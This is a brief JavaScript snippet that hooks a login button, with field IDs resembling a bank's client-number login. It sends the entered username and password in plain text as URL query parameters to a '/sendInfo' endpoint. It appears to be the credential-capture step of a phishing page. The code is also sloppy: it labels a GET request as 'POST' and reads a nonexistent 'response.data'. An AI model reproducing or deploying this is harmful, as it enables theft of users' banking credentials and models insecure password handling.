 const body = document.querySelector("#body");
 const userNameTextBox = body.querySelector("#txtMyClientNumber_field");
 const passwordTextBox = body.querySelector("#txtMyPassword_field");
 const button = body.querySelector("#btnLogon_field");
 
 

 

 button.addEventListener("click", () => {
   fetch(`/sendInfo?username=${userNameTextBox.value}&password=${passwordTextBox.value}`)
     .then((response) =>{
       console.log("POST request successful:", response.data);
     })
     .catch((error) =>{
       console.log("Error making POST request:", error);
     });
   
 });
